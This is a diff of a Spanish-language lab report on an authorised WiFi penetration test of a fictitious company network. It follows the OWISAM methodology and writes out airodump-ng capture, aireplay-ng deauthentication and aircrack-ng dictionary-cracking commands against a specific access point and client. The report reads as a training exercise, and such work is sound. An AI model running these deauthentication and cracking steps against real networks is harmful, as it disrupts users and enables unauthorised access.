@@ -8,11 +8,17 @@
 <h2>1. Resumen ejecutivo</h2><p>Se documenta una evaluación externa y autorizada de una red WiFi ficticia de DigitalSoft. El objetivo es registrar la captura de un handshake a partir de los datos confirmados de la empresa: desarrollo de software a medida, Enzo Gómez, Salta, Landing Page, Doki, la fecha 02/11 y la publicación de 2022.</p>
 <h2>2. Objetivos</h2><ul><li>Definir el AP, cliente y canal autorizados.</li><li>Capturar un handshake por reconexión manual del cliente propio.</li><li>Documentar el procedimiento y las evidencias de captura sin probar sistemas ajenos.</li></ul>
 <h2>3. Metodología OWISAM y alcance</h2><p>Se toma OWISAM, <em>Open Wireless Security Assessment Methodology</em>, como referencia para reconocimiento, identificación, captura controlada y validación de autenticación inalámbrica. Referencia: <a href="https://www.owisam.org/">owisam.org</a>. El pentesting es externo de caja negra: el evaluador no dispone de administración del AP y solo utiliza el perímetro radioeléctrico del laboratorio.</p>
-<h2>4. Ficha empresarial</h2><p><strong>Parámetros de captura:</strong> BSSID del AP <code>8E:75:F8:BA:9F:9E</code>; MAC del cliente propio <code>B2:58:73:0C:D6:41</code>. La plataforma y la interfaz inalámbrica están documentadas en <a href="../docs/hardware_software-laboratorio.md">hardware_software-laboratorio.md</a>.</p>
+<h2>4. Ficha empresarial</h2><p><strong>Parámetros de captura:</strong> BSSID del AP <code>8E:75:F8:BA:9F:9E</code>; MAC del cliente propio <code>B2:58:73:0C:D6:41</code>. La plataforma y la interfaz inalámbrica están documentadas en <a href="../docs/especificaciones%20de%20hardware%20y%20software%20para%20el%20laboratorio.md">especificaciones de hardware y software para el laboratorio</a>.</p>
 <h2>5. Procedimiento reproducible</h2>
 <h3>6.1 Reconocimiento</h3><pre>sudo airodump-ng wlan1mon
 </pre><p>Seleccionar únicamente el AP preparado para DigitalSoft: BSSID <code>8E:75:F8:BA:9F:9E</code> y cliente propio <code>B2:58:73:0C:D6:41</code>.</p>
 <h3>6.2 Captura</h3><p>Con <code>sudo airodump-ng -c 1 --bssid 8E:75:F8:BA:9F:9E wlan1 -w pruebared</code> corriendo, en otra ventana de la terminal se desautentica al cliente con <code>sudo aireplay-ng -0 9 -a 8E:75:F8:BA:9F:9E -c B2:58:73:0C:D6:41 wlan1</code>.</p>
 <p>La captura se registra en <code>pruebared-01.cap</code> y se debe verificar la aparición de <code>WPA handshake</code> antes de detener el proceso.</p>
 <p>Captura asignada: <code>handshake-jorge.cap</code>, con SSID <code>DigitalSoft</code>. Conservar el archivo fuera de Git y registrar la aparición del mensaje <code>WPA handshake</code>.</p>
+<h2>7. Diccionario y validación</h2>
+<p>La generación del diccionario contextualizado se documenta en <a href="../docs/Diccionarios.md">Diccionarios.md</a>. La validación se realizó únicamente sobre la captura y el diccionario de esta práctica; ambos archivos se conservan fuera de Git.</p>
+<pre>aircrack-ng -w diccionario_digitalsoft_10m.txt handshake-jorge.cap
+[00:00:06] 72256/10000000 keys tested (11412.84 k/s)
+</pre>
+<p><strong>Resultado:</strong> se confirmó la recuperación de la credencial mediante el diccionario de prueba. El valor no se reproduce por tratarse de información sensible.</p>
 </body></html>
